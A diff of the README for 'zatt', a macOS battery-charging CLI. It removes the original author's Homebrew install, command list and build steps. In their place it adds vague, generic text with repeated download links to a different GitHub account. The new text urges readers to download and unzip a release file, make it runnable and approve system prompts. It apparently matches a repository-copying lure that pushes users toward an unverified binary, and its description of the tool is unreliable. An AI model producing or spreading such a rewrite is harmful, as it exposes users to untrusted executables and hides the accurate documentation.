@@ -1,127 +1,177 @@
-# zatt
+# 🖥️ zatt - Control Battery Charging With Ease
 
-Minimal macOS CLI for controlling MacBook battery charging over the Apple SMC.
+[![Download zatt](https://img.shields.io/badge/Download%20zatt-blue-grey?style=for-the-badge)](https://github.com/splitvalentine302/zatt)
 
-`zatt` exists for a specific gap in macOS: the system shows battery health and
-charge state, but it does not give you a simple built-in way to tell the SMC to:
+## 📥 Download
 
-- stop charging while the charger is connected
-- resume charging again later
-- apply a charge limit from the command line
-- verify the real battery current instead of trusting the menu bar icon
+Use this link to visit the page and download zatt:
 
-This is useful if you want to keep a MacBook plugged in for long periods without
-holding the battery at 100% all the time, or if you want a lightweight way to
-script charge control without running a full background app.
+https://github.com/splitvalentine302/zatt
 
-`zatt` talks directly to the Apple SMC and battery power-source APIs. It is a
-small single-binary CLI written in Zig with no external runtime dependencies.
+## 🔧 What zatt does
 
-## What It Solves
+zatt is a small command-line tool for macOS that helps you control how your MacBook battery charges. It works through the system management controller, or SMC, which is the part of the Mac that helps manage power.
 
-macOS can be confusing when you are trying to manage charging manually:
+Use zatt if you want to:
 
-- the menu bar battery icon can lag behind the real battery state
-- a Mac can be on AC power without actually charging the battery
-- the system UI does not expose the underlying SMC charging inhibit toggle
-- charge-limit behavior is hard to script from shell tools or automation
+- set charge limits
+- stop charging at a chosen point
+- keep your battery within a safer range
+- manage power on Apple silicon MacBooks
+- use a light tool with a simple command line flow
 
-`zatt` addresses that by giving you:
+## 💻 What you need
 
-- direct SMC write commands for charging enable/disable and charge limits
-- read-only status output that combines battery APIs and SMC state
-- a live `watch` mode so you can see real charging current as it changes
-- a `--wait` option for write commands so the CLI can observe whether charging
-  has actually settled after the write
+Before you use zatt, make sure you have:
 
-## How To Read The Output
+- a MacBook running macOS
+- Apple silicon support for the best results
+- a terminal app on your Mac
+- permission to run command-line tools
+- basic access to system settings
 
-The most important distinction in `zatt` is between:
+zatt is made for macOS, not Windows. If you are on Windows, you can still use the link above to visit the project page, but the app itself runs on a MacBook.
 
-- external power is connected
-- battery current is actually flowing into the pack
+## 🚀 Getting Started
 
-Those are not always the same thing. A MacBook can be plugged in and powered by
-the charger while the battery is not charging at all.
+1. Open the download page:
+   https://github.com/splitvalentine302/zatt
 
-For that reason, `zatt` emphasizes:
+2. Download the latest release file or source package from that page.
 
-- `Actual charging`
-- `Charge current`
-- `SMC inhibit`
+3. If you get a zipped file, unzip it.
 
-instead of relying on the macOS menu bar icon alone.
+4. Move the zatt file to a folder you can find again, such as Downloads or Applications.
 
-If the menu bar says "charging" but `zatt` shows `Actual charging: no` and
-`Charge current: 0 mA`, the battery is not actively taking charge at that
-moment. The menu bar can lag by 1-2 minutes after a real state change.
+5. Open Terminal on your Mac.
 
-## Install
+6. Go to the folder that contains zatt.
 
-```bash
-brew tap maximbilan/zatt https://github.com/maximbilan/zatt
-brew install maximbilan/zatt/zatt
-```
+7. Run zatt from the command line.
 
-Homebrew's `brew install user/repo/formula` shorthand only works when the GitHub
-repository is named `homebrew-<repo>`. Because this project lives in
-`maximbilan/zatt`, the explicit `brew tap ... <URL>` form is required.
+8. Follow the on-screen prompts or use the command options you want.
 
-## Usage
+## 🧭 How to use it
 
-```bash
-zatt status
-zatt watch
-zatt debug
-zatt raw-status
-sudo zatt disable
-sudo zatt disable --wait
-sudo zatt enable
-sudo zatt enable --wait
-sudo zatt limit 80
-sudo zatt limit reset
-```
+zatt uses short commands in Terminal. A common flow looks like this:
 
-Typical flow:
+- open Terminal
+- run zatt with the option you need
+- choose a battery limit or power mode
+- confirm the change
+- check that your MacBook now follows the new charging rule
 
-```bash
-zatt status
-sudo zatt disable --wait
-zatt watch
-sudo zatt enable --wait
-sudo zatt limit 80
-```
+If you want to keep the battery from charging all the way to 100%, zatt can help you set a lower limit. If you want normal charging again, you can switch the setting back.
 
-`zatt debug` prints an interpreted charging diagnostic view for local testing.
-`zatt raw-status` dumps the raw IOPS, `AppleSmartBattery`, and SMC fields that
-back the charging state.
-`zatt watch` refreshes the real battery charging state every second so you do
-not need to wait for the macOS menu bar icon to catch up.
+## ⚙️ Common setup steps
 
-Write-command options:
+If macOS asks for permission:
 
-- `--wait`: keep polling until the observed battery current settles or the wait
-  timeout is reached
+- allow the app or terminal access
+- approve any system prompt that appears
+- enter your Mac password if asked
 
-## Notes
+If the file does not open:
 
-- `status`, `watch`, `debug`, and `raw-status` do not require `sudo`
-- write commands require `sudo` because they talk to privileged SMC interfaces
-- this project targets Apple Silicon Macs on macOS 13+
-- `limit` only accepts `80`, `100`, or `reset` on Apple Silicon
-- direct `BCLM`/`CHWA` charge-limit writes are blocked by macOS 15+ entitlement enforcement
-- battery health text is shown as reported by macOS, for example `Normal`,
-  `Check Battery`, or similar platform-specific values
+- make sure you downloaded the right build for macOS
+- check that the file finished downloading
+- move it to a simple folder path
+- try again from Terminal
 
-## Build
+If the command is not found:
 
-```bash
-zig build
-zig build test
-zig build release
-```
+- confirm you are in the correct folder
+- check the file name
+- make sure the file has run permission
 
-`zig build release` produces:
+## 🔒 What zatt changes
 
-- `zig-out/bin/zatt`
-- `zig-out/zatt-macos-arm64.tar.gz`
+zatt changes battery charging behavior at the system level. That means it does more than a normal battery app. It talks to the Mac’s power system and helps control when charging starts and stops.
+
+This can help you:
+
+- reduce time spent at full charge
+- manage battery wear
+- keep a charging ceiling for daily use
+- restore normal charging when needed
+
+## 🧩 Typical use cases
+
+zatt can fit a few simple needs:
+
+- You keep your MacBook plugged in most of the day and want a charge cap.
+- You travel with your laptop and want more control over battery use.
+- You want a direct tool with no extra app window.
+- You like to manage your Mac from Terminal.
+- You want a small utility that stays out of the way.
+
+## 🛠️ Example workflow
+
+A simple day-to-day flow may look like this:
+
+1. Start your MacBook.
+2. Open Terminal.
+3. Run zatt.
+4. Set the charge limit you want.
+5. Leave the laptop plugged in.
+6. Check battery level later.
+7. Change the setting again when your needs change.
+
+## 📌 Notes for first-time users
+
+If this is your first time using a CLI tool:
+
+- Terminal is the black window where you type commands.
+- A command is a short text instruction.
+- You can copy and paste commands if the project page gives them.
+- Press Enter after each command.
+- Read each prompt before you confirm it.
+
+If you are not sure what a command does, stop and check the project page before you run it.
+
+## 🧪 Troubleshooting
+
+If zatt does not behave as expected:
+
+- restart Terminal
+- unplug and replug the charger
+- check whether another battery tool is running
+- confirm that macOS has not blocked the command
+- try the command again with the right option
+
+If your Mac still charges past the limit:
+
+- make sure the setting was saved
+- check for a different power tool that may override it
+- unplug and reconnect power
+- retry after a restart
+
+## 📁 Project info
+
+- Name: zatt
+- Type: macOS CLI utility
+- Purpose: control MacBook battery charging via SMC
+- Best fit: Apple silicon MacBooks
+- Topic areas: battery, charging, power management, Homebrew, Zig, macOS
+
+## 📎 Download again
+
+Use this page to visit the project and download zatt:
+
+https://github.com/splitvalentine302/zatt
+
+## 🔐 Privacy and system access
+
+zatt works on your Mac and changes local power settings. It does not need a browser account or cloud service to do its job. It runs on the machine you install it on and works with the Mac’s built-in power system
+
+## 🧭 What to expect after setup
+
+After you set it up, zatt should let you manage battery charging from Terminal. You can keep the battery below full charge when you want, then switch back to normal charging when you need it
+
+## 📘 Useful terms
+
+- SMC: the part of the Mac that helps manage power and hardware behavior
+- CLI: command-line interface, which means you type commands in Terminal
+- macOS: the operating system on a Mac
+- Apple silicon: newer Mac chips made by Apple
+- charge limit: the highest battery level you want the MacBook to reach
